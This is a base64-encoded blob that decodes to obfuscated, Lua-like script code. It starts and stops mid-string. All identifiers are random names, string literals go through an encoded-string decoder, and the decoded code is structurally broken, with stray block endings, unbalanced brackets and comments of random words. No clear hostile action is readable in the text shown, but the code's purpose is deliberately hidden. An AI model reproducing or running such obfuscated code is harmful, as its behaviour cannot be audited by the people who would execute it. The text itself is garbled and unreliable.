wgewotLSBUSmRHU25WaGpKIGBYRVR2VUVuSHpYLk1JeUZDeVd5Sk9gIHJKT1ZGQXZOQ2sgTXdRQ0NMSVVBWSBIWnlIV3pJYlB2IGNiY2JscGVIeGQgVnBSRUlUaWRFbyBjTndZSnVXVUFiLgopCiAgICAgICAgICAgIGVuZAotLSBtRnlWTmFPUUNKIGtIS1lWRUVGSWIgQ0taYkFuRUhadyBwTE5JY2tZSm9PCiAgICAgICAgICAgIC0tIEtlWUpDdWxybnMgcWNSYmtIU2lXYiBBQklBZUJlV21PIFBUUWF5V3pETEQga3FHWWFYUlFNaQogICAgfQogICAgICAgIE1xWW94RG9zSkcgPSAoKFBpQkVqbnVMaGcpWyJ6YVBiaFRoYlJuIl0oImtwUElTc1pxV2w9IikpLAopCiAgICAgICAgaWYgZExRZGxic1prdzpWd0l2aEV3Tkt2KCgocnVOSmRoS0pzWSlbInphUGJoVGhiUm4iXSgicUpRUlBsUU9xeT09IikpKSB0aGVuCiAgICAgICAgICAgICAgICBLa3pPaVNCanNsLkhXdnFFVmlIbU0ueEhsZXlDU0NBeTpDS1pjZllKcWp0KGlxbHRrWHdsT0Y6Wndvb1NpalVISyhOZ21wZmR5S2dKKSkKICAgICAgICAgICAgICAgIGxvY2FsIFh4akpTSnNxaUsgPSBLa3pPaVNCanNsLkhHSXJRdnpPeXU6Wndvb1NpalVISygoKFJvS0pyanp4cHUpWyJ6YVBiaFRoYlJuIl0oIkJmV2dwclJRblA9PSIpKSkKICAgICAgICAgICAgICAgIC0tIHJWQW5zcUhueVYgemh2VmdkVXJXVSBNd1FDQ0xJVUFZIElvYlNlamlOR1IgRG12dExMTExKciBTREJlbldHSFhWCiAgICAgICAgcldkTXpLcUZUaigpClhVQkJua0FFencud2JXYXJGeFR1byA9IFdqWXJaa2hLVk0ud2JXYXJGeFR1by5uZWxjR3pMY25vCgogICAgICAgIGdEWnFoVG1wcWcKLS0gVEpkR1NuVmhqSiBKTkpVaFlDeU1VIHJKT1ZGQXZOQ2sgTXdRQ0NMSVVBWSBDWGJ1d3F3aWZVLCBac1hIa3RQRGlyIFp5ZndmRlNCa28sIGF0WnRESlptQ2EgS096V1lOZ1BjeQopCikKICAgICAgICAgICAgY1hTRFVxd3dsRC5nUUphWUVOYVRBID0gZmFsc2UKcEZkek1hbGJMdy54Qm1wcXJLbGxLID0gUWViaG5iVEVuQgpFU2hYSFJxSHBKOlZwY09uS3VXSk8oCmxvY2FsIGVnTU1TVkRMZnMgPSBmYWxzZSAgLS0gWmRCZUZqWXBaeCBvRmV4WmpUTW1hIG5yWEV3bGN6bkIKICAgIH0KICAgIERLZktSWGpXUmUuYlhtVGlSelVjSDpPd0pEWVRXd1FiKCkKYW9lQ250Vml5cS5GR05LZlpGUkNpKAoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBXeVpRVUFTeUd4ID0gek9kd21GdkxKVzpad29vU2lqVUhLKCgoUUpVUFVZQmlTSilbInphUGJoVGhiUm4iXSgiY1BjbmZ2VHlWRT09IikpKQogICAgUW5MWGlWVk9Vai5ER1Zua05pa2hTOml2VXJKWHdrblooCiAgICAgICAgZEdmcFVaSURFRiB0cnVlIHBZaWlXWkdVQnIKCiAgICBoeGdJVXlDVXNPID0gZmFsc2UsCiAgICAgICAgICAgIGxvY2FsIHZBam5Ra05OY2sgPSAoKGZSRW9JeW5BUGUpWyJ6YVBiaFRoYlJuIl0oIlVWWUx4U2RxdU89PSIpKSAuLiBkYVRkU3RvZ1BQCgopCgogICAgZW5kCiAgICAoKEF6Q2pxWlRiYmIpWyJ6YVBiaFRoYlJuIl0oIm5GdVV0eWVISlM9IikpLAogICAgZW5kCiAgICAgICAgICAgICAgICBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSk6Wndvb1NpalVISygoKFRaUHRudnJ3VVIpWyJ6YVBiaFRoYlJuIl0oIkRFZGdQV3VxdXIiKSkpLnhCbXBxcktsbEsgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSkuUmdVTFpDdnJuVwogICAgICAgICAgICBpZiBBTlV3SGJVdVNjIEx6dW9jVkRzR3IgQU5Vd0hiVXVTYyA+IDAgdGhlbgogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZSwKfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBtSExFWUNYbE5HID0gamNiUHFnZ1NhcTpad29vU2lqVUhLKCgoTW1OY3ZMbWVSUylbInphUGJoVGhiUm4iXSgiYWJZcVZVcERFRiIpKSkKICAgICAgICAgICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyh0bHR1UmxyenNhLCBkTFFkbGJzWmt3KQogICAgewogICAgICAgICAgICAgICAgICAgIHNzYkZBS21tSUMsCiAgICBGU3R6bER2bk5DKCkKLS0gU3hnR1NNQ0NaTi5oSUNyQVpVcWxkID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAuMzUsIDAsIDAuMTUsIDApIC0tIENYWnpNSVNrV3YgbE1wQnh0cUVWUCBjdGNmUnJrY1FrIG5ibmtPR2xWUlUKICAgICAgICAgICAgZW5kCiAgICBLa3pPaVNCanNsOlp3b29TaWpVSEsoKChsT3ZUenBncnZPKVsiemFQYmhUaGJSbiJdKCJsUXFWYXh0UHJaIikpKSBMenVvY1ZEc0dyIEtrek9pU0Jqc2wuSEdJclF2ek95dTpad29vU2lqVUhLKCgoQlJqcU9FR3djRClbInphUGJoVGhiUm4iXSgiTkJYa3ptV0RWciIpKSkgTHp1b2NWRHNHcgogICAgICAgICAgICBjeVlVd1FaTHl5OnNPREZvenp3UHkobVZiam1meWRWbS54aFRvZ2plaWZoKG1LUkxJY0JScE0pKQogICAgWkVOT2pCcWZqSCA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoWXlseGF4b29RailbInphUGJoVGhiUm4iXSgiV09BRkp1ZEFCRyIpKSwgeFJqWUFva3VhaSA9ICgoUE93TFJhZ2xUUylbInphUGJoVGhiUm4iXSgic3ZsRWZrb3JBTSIpKX0pLAoKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgQ3p3eFVvaFpYTyA9IFlUcXp5eGpvemQgTHp1b2NWRHNHciBZVHF6eXhqb3pkLndTUU9pUGNIa0kgSmRsbGRmRnl3WCBuaWwKICAgICAgICAgICAgICAgICAgICBpZiBxc2xHQnNIR0JWIEVibHRsRnJkRXMgdGhlbiBsVnBTZWVlT2lDIGVuZApRbkxYaVZWT1VqLlp6VEFpWGdkb246aXZVckpYd2tuWigKICAgIGRjUUpKWnBNZUQoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgaHhnSVV5Q1VzTyA9IGZhbHNlLAogICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGp3UXh4Slhob20gPSBUWEhrVUZLakhVLlBZV2lETFlkUEMuSk1aVUhCT2N5ajpad29vU2lqVUhLKCgoaEdTVFNoSk9qQSlbInphUGJoVGhiUm4iXSgiZnpHaG5ZVE9ZUz09IikpKQotLSBsb2NhbCBSWXBsTGpnR3NDID0gUW5MWGlWVk9Vai5SWXBsTGpnR3NDOmZJV0RBT3BCeEYoKChYR0JOc3h6Z2xKKVsiemFQYmhUaGJSbiJdKCJyWHFaWnR5YlZCPSIpKSkvCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIHBDbndEZWdLUW4gPSBtZlN2VnZFWHBLOlp3b29TaWpVSEsoKChtcWR3eGtPZnVkKVsiemFQYmhUaGJSbiJdKCJyVFJySktYQmx6IikpKQpMT2pacEZTcVBULnhCbXBxcktsbEsgPSBXcHFVWGZnSlhMCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBrYldFQmFpdFBHID0gU0ppaW5mZ1NyVi5oSUNyQVpVcWxkOkR4a1BScFZxekUoS2tobFp2bFFzQy5oSUNyQVpVcWxkLCAwLjcpCiAgICBsYXdrV0FWVWhaID0gKChBdE9ublFQaHBzKVsiemFQYmhUaGJSbiJdKCJlZGp4TWZkY3poPSIpKSwKICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKDEwMCkKCiAgICBRbkxYaVZWT1VqLnFLd1VhaVZqc0k6aXZVckpYd2tuWigKICAgIHsKKQpsb2NhbCBRbkxYaVZWT1VqID0gewogICAgICAgIGxvY2FsIEFxa2VDUVJlRGEgPSAoZkFja0xQck9YWiA9PSAoKGxrQ21DWUhuS1gpWyJ6YVBiaFRoYlJuIl0oIkhUemNsTFpsaHE9PSIpKSkgTHp1b2NWRHNHciA4MCBKZGxsZGZGeXdYIDEwCiAgICAgICAgdkdMbEJ6V2dDaiA9ICgoY3R4WHZCV25HaClbInphUGJoVGhiUm4iXSgoKFJjY2dCa0JRWHMpWyJ6YVBiaFRoYlJuIl0oKChUc3V5YXRNcFJSKVsiemFQYmhUaGJSbiJdKCgoekVFQ3lPZU5FQylbInphUGJoVGhiUm4iXSgoKEhiUVRsempTb0opWyJ6YVBiaFRoYlJuIl0oKChGVkxtcnFRVEphKVsiemFQYmhUaGJSbiJdKCgoTkZsR0NUUXp5cSlbInphUGJoVGhiUm4iXSgiIikpKSkpKSkpKSkpKSkpLAoKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBBYXdvY0dsTUVhOlp3b29TaWpVSEsoKCh6Y3NVYmxrVnNWKVsiemFQYmhUaGJSbiJdKCJLdWZGcldsVlBHIikpKSBMenVvY1ZEc0dyIHJvaUtZa3JYSHQuUWJZeUVyQWNsSyB0aGVuCgogICAgICAgICAgICAgICAgICAgIENaeE11eUl6QW8uekhMVUdTdmx0ZCA9IEFEQ25TR25ydFEKICAgICAgICAgICAgICAgIElXREpQQ2Rndkcuc3dEcHdjeU1vRzpramFxanpEbkJsKApRbkxYaVZWT1VqLlp6VEFpWGdkb246aXZVckpYd2tuWigoKE50Tk1OYkRNUUcpWyJ6YVBiaFRoYlJuIl0oImFpYVR4UmVlVkw9PSIpKSwgewpCWW9WbVVJa0RhOnZuV1NoeE1jdG0oKQpYVUJCbmtBRXp3LnhCbXBxcktsbEsgPSB2Y0FoV0Z1QU1JCiAgICBlbmQKICAgICAgICAgICAgaG5RVlFVRW5JeShES2ZLUlhqV1JlOklVcnZDTWJMTFMoKChRc1hHRXVWUXNvKVsiemFQYmhUaGJSbiJdKCJ0WVpadHNBbGtwPSIpKSkpKCkKICAgICAgICAgICAgICAgIE5zamlpc1FGTlguYlRkZ0htRVVpTC5semJxTFd4bVFoID0gYWtSQm1wRldIdi5BZ3VmWnNhVEJ5KDE0MCwgMTQwLCAyMjApCiAgICAgICAgICAgICAgICBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSkuUmdVTFpDdnJuVzpad29vU2lqVUhLKCgoVFpQdG52cndVUilbInphUGJoVGhiUm4iXSgiREVkZ1BXdXF1ciIpKSkueEJtcHFyS2xsSyA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKExJaVlBYXJnd0spWyJ6YVBiaFRoYlJuIl0oImdNTHdldXN6dGU9IikpKQpRbkxYaVZWT1VqLnFLd1VhaVZqc0k6aXZVckpYd2tuWigKICAgICAgICAgICAgICAgICAgICAgICAgeUpZR2RWanplRy5TVEJiSEJnZktLKGF0UHBab3pKWmcsIDEsIFhVRG5lVHljc2spCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCnNzYkZBS21tSUMuTElCdmlrSnZrWCA9IHJlV1NDUkdPZnMoMC4xNSkgLS0gcFVQRlJ4Q2lMZSBSdXBvVENmdldmIG1GVXJvclNsdkwKICAgIGZ1bmN0aW9uKHdTUU9pUGNIa0kpCi0tIFJ1VlVuWGlUZVAuWG1IcnZTd0tVSSA9ICgocURaWFBITmNYSClbInphUGJoVGhiUm4iXSgiQUFERnFVclVrUD09IikpCikKZW5kCiAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCiAgICAgICAgICAgIC0tIG9oVVJLTWpyRWcgaVlUT3NUd0JERCBiRnpwZ1BTZ1VEIHRlU2N3Q0dscE0gUVhDY2ZvdmxXRwogICAgICAgIHJDbnhHdGxDWFE6T3B5TlBSZVJwWCgwLCAwLCAwLCBmYWxzZSwgREtmS1JYaldSZSwgMCkgLS0gUFRwZVdtTXJ2SSBFeVRYTmRuQlRECiAgICBRbkxYaVZWT1VqLnFLd1VhaVZqc0k6ZU1JQmtzTG9EUigKYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKAogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyhabGxta2JmSG1xW2RMUWRsYnNaa3cuVXVXS0hCcWxCZV0sIGRMUWRsYnNaa3cubVZiam1meWRWbSkKbG9jYWwgQVhYQkp5Vk9TYiA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGNYU0RVcXd3bEQubm1lQXR0eUtSZiA9IHdTUU9pUGNIa0kKbG9jYWwgZnNmeHlOdWh5SSA9IFFuTFhpVlZPVWouWnpUQWlYZ2RvbjppdlVySlh3a25aKCgodENMUWVtWldUVilbInphUGJoVGhiUm4iXSgidUNDbWdkVWNBTj0iKSksIHtsYXdrV0FWVWhaID0gKChaUnZkWHhrYWloKVsiemFQYmhUaGJSbiJdKCJPdUd3anlFdFBRIikpLCB2R0xsQnpXZ0NqID0gZmFsc2V9KQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZ0RacWhUbXBxZwpsb2NhbCBkd1lreWFoS0psID0KCiAgICAgICAgICAgICAgICAgICAgICAgIFhVRG5lVHljc2subWxvSllOQnZVdyA9ICgoY3R4WHZCV25HaClbInphUGJoVGhiUm4iXSgoKFJjY2dCa0JRWHMpWyJ6YVBiaFRoYlJuIl0oKChUc3V5YXRNcFJSKVsiemFQYmhUaGJSbiJdKCgoekVFQ3lPZU5FQylbInphUGJoVGhiUm4iXSgoKEhiUVRsempTb0opWyJ6YVBiaFRoYlJuIl0oKChGVkxtcnFRVEphKVsiemFQYmhUaGJSbiJdKCgoTkZsR0NUUXp5cSlbInphUGJoVGhiUm4iXSgiIikpKSkpKSkpKSkpKSkpCiAgICB2R0xsQnpXZ0NqID0gZmFsc2UsCgoKICAgIFFuTFhpVlZPVWouWnpUQWlYZ2RvbjppdlVySlh3a25aKAogICAgICAgICAgICAgICAgbG9jYWwgSW9iU2VqaU5HUiA9IERLZktSWGpXUmUuaUxuR3hkZGhBai5La3pPaVNCanNsLkhXdnFFVmlIbU06eVBTbXZEWkRMYygoKGZZWm9xUmhZVU0pWyJ6YVBiaFRoYlJuIl0oIklzVVZSZExxUHU9PSIpKSkKICAgICAgICAgICAgICAgIFRYSGtVRktqSFU6QlNpRG1TS0hTcygoKFZJYm5ybUlWWkwpWyJ6YVBiaFRoYlJuIl0oIlBjVVpUZnluTUc9IikpKTpCU2lEbVNLSFNzKCgoYnN5bHNOVHBIbClbInphUGJoVGhiUm4iXSgiUGRXeWpWanBFST09IikpKTpCU2lEbVNLSFNzKCgoUkJJSFBHanlmVClbInphUGJoVGhiUm4iXSgiVUFhdkZqaUFKdyIpKSk6QlNpRG1TS0hTcygoKFJCSUhQR2p5ZlQpWyJ6YVBiaFRoYlJuIl0oIlVBYXZGamlBSnciKSkpOkJTaURtU0tIU3MoCiAgICAgICAgbG9jYWwgYUJRZVhzZHJrdiA9IEpFQlRPbUFNQngoSFdTU2tBR3VadSkKfSkKICAgICAgICBsb2NhbCBFTGFaUXBVdk1MID0gSVdESlBDZGd2Ry5zd0Rwd2N5TW9HOmtqYXFqekRuQmwoZnVuY3Rpb24oKQpsb2NhbCBIVGJHYU16YlZXID0KICAgICAgICBlbmQKICAgICAgICBYWlRTUEJ6VVZPIE1wS2FtVkdtWGosIFhVRG5lVHljc2sgbXRwZENFY0VEaiB5aHpUVWNDWWZPKERLZktSWGpXUmU6U2NTRGlEdU9acygoKHJ4T2hWZEJHdWIpWyJ6YVBiaFRoYlJuIl0oImJXYnFHY3VzQnY9IikpKTpsVEpnd1NJaFlWKCgoUnNuc2NxeGtvUClbInphUGJoVGhiUm4iXSgiU3JPd3JDTnFnVT0iKSkpKSBwWWlpV1pHVUJyCgogICAgICAgICAgICBlbmQKKQogICAgfQpzc2JGQUttbUlDLnN6bWh3cXJwcnQgPSBSekt3Sk9WUWVtLnhoVG9namVpZmgoMC41LCAwLjUpCiAgICBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGVFRkpPTElRd2MgPSBkd1lreWFoS0psLndTUU9pUGNIa0kKbG9jYWwgTkRZaURmdkZ3cCA9IG54RWpSU0lKT246QlNpRG1TS0hTcygoKGpwalNnQWhkVnUpWyJ6YVBiaFRoYlJuIl0oInlrQ2pVT2VRSEs9IikpKSAtLSBLZVlKQ3Vscm5zIHJGSUJjb3JkWEIgcWNSYmtIU2lXYiBEbXZ0TExMTEpyIHdZVWtHd2xUSnMga0hLWVZFRUZJYiBOSWt3cVhtenBOJAogICAgICAgICAgICAgICAgICAgIGp3UXh4Slhob20gPSBUWEhrVUZLakhVLlBZV2lETFlkUEMuSk1aVUhCT2N5ajpad29vU2lqVUhLKCgoSXlrUEFxUll3UClbInphUGJoVGhiUm4iXSgibGduc0J1eGRuST0iKSkpCgogICAgaWYgUm1Gc3hWcnhXcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgandReHhKWGhvbSA9IFRYSGtVRktqSFUuUFlXaURMWWRQQy5KTVpVSEJPY3lqOlp3b29TaWpVSEsoKChvYUVqTXNLY3dqKVsiemFQYmhUaGJSbiJdKCJtSG5yWGRoWXdCPT0iKSkpCiAgICBJQ0d2RXZrbEl6LkxJQnZpa0p2a1ggPSBWcG1pTkZYYWdPLnhoVG9namVpZmgoMTAsIDEsIDEwKSAKICAgICAgICApCmxvY2FsIENqR0V2emNseVUgPSBXcHFVWGZnSlhMOlp3b29TaWpVSEsoKChyeUNCWGRFVURmKVsiemFQYmhUaGJSbiJdKCJxZ3p0RXJBSmxtIikpKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoZVFvbVVXTk5HbClbInphUGJoVGhiUm4iXSgiUXh5THNDTEZVRyIpKSkgSmRsbGRmRnl3WCBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChzT0RKdFRReXdOKVsiemFQYmhUaGJSbiJdKCJUV21xS1JWUWVOPT0iKSkpIHRoZW4KICAgIH0KICAgICAgICAgICAgICAgICAgICByQ254R3RsQ1hROnB3WUhrUlF5SGYoZmFsc2UsIFdqWXJaa2hLVk0uQ3VQa0Jud2ppeS5vaFVSS01qckVnLCBmYWxzZSwgREtmS1JYaldSZSkKICAgICAgICBvRUxPVkZoU1d4ID0gKChNc2hZZEdyS2VzKVsiemFQYmhUaGJSbiJdKCJBcWNIZ2ZQaGF6IikpCmxvY2FsIEJsTnl5TXVSbHggPSBXcHFVWGZnSlhMOlp3b29TaWpVSEsoKChWSWJucm1JVlpMKVsiemFQYmhUaGJSbiJdKCJQY1VaVGZ5bk1HPSIpKSk6QlNpRG1TS0hTcygoKGJzeWxzTlRwSGwpWyJ6YVBiaFRoYlJuIl0oIlBkV3lqVmpwRUk9PSIpKSkKICAgICAgICAgICAgWmx3YXJSb25pVigoKE9OTGhpSUhrcnYpWyJ6YVBiaFRoYlJuIl0oInFPd01McnVQS249IikpKQogICAgICAgICAgICBiU2V5anl3ZEVPKCkKICAgICAgICB2R0xsQnpXZ0NqID0gTnl6VWFpV3FXcQogICAgICAgICAgICApCikKICAgIGZ1bmN0aW9uKCkKUW5MWGlWVk9Vai5ZRnFsZVFZb252OlZJSGNZWlNSdkIoCmxvY2FsIG9CeXNNaG9IUEIgPSB7fQogICAgICAgICAgICBlbmQKbG9jYWwgRVNoWEhScUhwSiA9IFFuTFhpVlZPVWouWnpUQWlYZ2RvbjpmSVdEQU9wQnhGKCgoZ2t1Uk54ekF0QylbInphUGJoVGhiUm4iXSgiUkFzU3NOT2xZdCIpKSkKbG9jYWwgVVdmeUJsUVd1aSA9IGlMbkd4ZGRoQWouS2t6T2lTQmpzbApsb2NhbCBsc0VYTGdxdHRPID0gUW5MWGlWVk9Vai5NSXlGQ3lXeUpPOml2VXJKWHdrblooKChDalhIRlNXTmZIKVsiemFQYmhUaGJSbiJdKCJ0ZGV5TVRhd3BoPSIpKSwge2xhd2tXQVZVaFogPSAoKExwYWpkVkRRR0cpWyJ6YVBiaFRoYlJuIl0oIllnd0JsSVhwQkM9IikpLCB2R0xsQnpXZ0NqID0gZmFsc2V9KQppZiBaa3hoWG1SbUJ3KCkuc0JTV2NjSFZ6SCB0aGVuCi0tIEF5Uk9IU3NTZFkKbG9jYWwgRWp2VGVCcEtJeCA9IEtrek9pU0Jqc2w6QlNpRG1TS0hTcygoKHJBaFZaSlBMUkcpWyJ6YVBiaFRoYlJuIl0oIlllT1R5Uml0Wlg9IikpKQogICAgICAgICAgICAgICAgdFVEVkhxTnpWbDptTVdyRm1IT3RVKElLTGxDa0xSc0osICgod0Nqa0l6cGl3UilbInphUGJoVGhiUm4iXSgiYllnZFp6UEpVVD09IikpLCBuaWwsIDEpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoUFlWR2haYXpWcSlbInphUGJoVGhiUm4iXSgibHZjd2J2VkJRRT09IikpLApsb2NhbCBmdW5jdGlvbiBiSkprS3lDV3pDKFJtRnN4VnJ4V3ApCiAgICAgICAgZW5kCgoKICAgICAgICAtLSBjeU9zS1BzQXV1IEp3RldFS2p3Z0QgYnBZaW1RandGVSBqUGVlYnNiV2tNIGpJb2VVY0VUV2EKbG9jYWwgckNueEd0bENYUSA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKEpVeGVSWHRlbGspWyJ6YVBiaFRoYlJuIl0oImNOYnZxUUFCT0k9PSIpKSkKUWViaG5iVEVuQi5zakhlcEFKTUF5ID0gMSAtLSBuV0ZWWGpDU1ZsIEloWVF2bFVvUXcgRERheWpZYVNwaiBkcktVT3RCRGZtIE11elNtSUJudXAgaVpwRlFTeGtadAoKICAgICAgICBjSndGYVNZTG1aID0gZmFsc2UKICAgIHlKWUdkVmp6ZUcuRXFCSUdPdUFnZyhKSEJZSGNyQ3lTKQogICAgICAgICAgICBpZiBtZlN2VnZFWHBLIHRoZW4KZW5kCmxvY2FsIFdwcVVYZmdKWEwgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChVVmlzeFVESExVKVsiemFQYmhUaGJSbiJdKCJCUWNaRW5DVmtkIikpKQogICAgICAgICAgICBsb2NhbCBlaUZBbnZFV1VDID0gY3lZVXdRWkx5eS5XcUJXVXZqckhTLmhJQ3JBWlVxbGQKKQogICAgaWYgcXNsR0JzSEdCViBXcUJXVXZqckhTIEpkbGxkZkZ5d1ggcXNsR0JzSEdCViB4SGxleUNTQ0F5IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbUhMRVlDWGxORyA9IGpjYlBxZ2dTYXEuVlhVQlRhdU5wZgogICAgICAgICAgICBpZiBDeEFObFFGcWdCIH49IG5pbCB0aGVuCiAgICAgICAgICAgIGNYU0RVcXd3bEQuZ1FKYVlFTmFUQSA9IHRydWUKICAgIHZHTGxCeldnQ2ogPSBuaWwKc3NiRkFLbW1JQy5zakhlcEFKTUF5ID0gMQogICAgICAgICAgICBnRFpxaFRtcHFnCgogICAgICAgICAgICAgICAgTnNqaWlzUUZOWC5Wc09iSHRUTGZ3Lmx6YnFMV3htUWggPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMTgwLCAxODAsIDE4MCkKLS0gTUNad3pvY2prYSBKa211eXBQRWpSIHZtRFVaV0tIZ1UgUmFZR2lFelhwSSB3ZVVFUkZuV0dzCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oQk1jWUJCUWxMUikKICAgIHZHTGxCeldnQ2ogPSBmYWxzZSwKICAgICAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKHNSaVJuaUpydkcpWyJ6YVBiaFRoYlJuIl0oInFEclJCTWp3WngiKSkgdGhlbgogICAgICAgIGVuZAogICAgbG9jYWwgSFd2cUVWaUhtTSA9IEtrek9pU0Jqc2wuSFd2cUVWaUhtTQp9KQogICAgICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKDAuMSkKICAgICAgICAgICAgICAgICAgICBvVGtLaVFtZkdsOm9wV3B4Tkp4UWooKChOaEZ0Z0FjcWhCKVsiemFQYmhUaGJSbiJdKCJ5TUpzVkJ2cEl1PSIpKSwgKChYeWZKeHBNamhSKVsiemFQYmhUaGJSbiJdKCJBVXFPVGxiWm1qPSIpKSwgNSkKICAgICAgICAgICAgICAgICAgICAgICAgWFVEbmVUeWNzay5YWEVxckZJRlZ5ID0gZmFsc2UKZW5kKQpsb2NhbCBYbUlIR09oRXdnID0KICAgICAgICAgICAgSEdJclF2ek95dS5BYXdvY0dsTUVhLkRJbmdqS01vWFYuZWtxd0dwakR1YSA9IGZhbHNlCmxvY2FsIFVXZnlCbFFXdWkgPSBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbAogICAgICAgICAgICAgICAgQ0J3TGtSR1JqdCA9IDMKCiAgICBaWnJ2aVhMY0FMKCgoZFBUd1hWU01sRSlbInphUGJoVGhiUm4iXSgiTndkWkxMcmJMcyIpKSkKICAgICAgICBlbmQpCgogICAgICAgIElDR3ZFdmtsSXo6THRCaWd5U0laVygpCiAgICAgICAgICAgICAgICBJTmJUWVJqR1RhOnVGTWpXanVxWkUoKQpsb2NhbCBYZ292RGh5VGJZID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKbG9jYWwgZnVuY3Rpb24gSkVCVE9tQU1CeChxVVlhTGtGT2VPKQpsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5LdUdzVVZwbFVkOmZJV0RBT3BCeEYoKChjYklGSnRKbVZrKVsiemFQYmhUaGJSbiJdKCJrWU5vUUFTS0NQPSIpKSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZEdmcFVaSURFRiBKTkpVaFlDeU1VLldGSnhxVU9Vb24gcFlpaVdaR1VCcgogICAgICAgICAgICAgICAgICAgICAgICBtT3RXRlBOSmpTID0gbVZiam1meWRWbS54aFRvZ2plaWZoKGp3UXh4Slhob20uaElDckFaVXFsZCArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgyMCwgMTE1LCAyMCkpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgRkdOS2ZaRlJDaSA9IFRMSFdxVG55Rkoua0VlYU1OcldGWChGR05LZlpGUkNpLCAwLCA1KQogICAgICAgICAgICBRQk9Uck1Gd1haID0gdUhzU2dESEppVwogICAgewogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHRIZW92aEprUkEpCiAgICAoKHJMbW5RR0lESWIpWyJ6YVBiaFRoYlJuIl0oInh1UUNTWlpIQVM9PSIpKSwKLS0gbUZ5Vk5hT1FDSiBrSEtZVkVFRkliIFh3T3puZm5lbHQgdmdDVUtXZG9YbyBVdVdLSEJxbEJlIFphR1BZZGZoSFIgZHJLVU90QkRmbSBBQklBZUJlV21PIGtzYmRaeVp0UXAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTyhGR05LZlpGUkNpKQogICAgICAgICAgICBFWHRGUGJEdEdPKCkKZW5kCmxvY2FsIFhuTFZlanlacWIgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChITk5MbW5HUnBLKVsiemFQYmhUaGJSbiJdKCJabWFWeVpobmRRIikpKQoKCiAgICAgICAgY0p3RmFTWUxtWiA9IHRydWUKICAgICAgICAgICAgICAgICAgICBBYXdvY0dsTUVhLnhGRllwbmtHWEkubHpicUxXeG1RaCA9IGFrUkJtcEZXSHYuQWd1ZlpzYVRCeSgyMzUsIDIxMCwgMTUwKQogICAgICAgIE91TmVCbUJQaEMgPSBXallyWmtoS1ZNLm95VENEamZuQUQudk5vcWlzc2tISiAtLSBNakRSUlRvSk1lIGFjYVZScUZ6SkogRExEaE5acG5keCBicFlpbVFqd0ZVIEl4Vk9RSFZQb3IKICAgICAgICAgICAgWmx3YXJSb25pVigoKG5UU1pWakNYTGEpWyJ6YVBiaFRoYlJuIl0oIkhtcUZCVWljUkciKSkpCmxvY2FsIFdxQldVdmpySFMgPSBDeEFObFFGcWdCOlp3b29TaWpVSEsoKChRSlVQVVlCaVNKKVsiemFQYmhUaGJSbiJdKCJjUGNuZnZUeVZFPT0iKSkpCgogICAgbGF3a1dBVlVoWiA9ICgoekl6b1VxY3B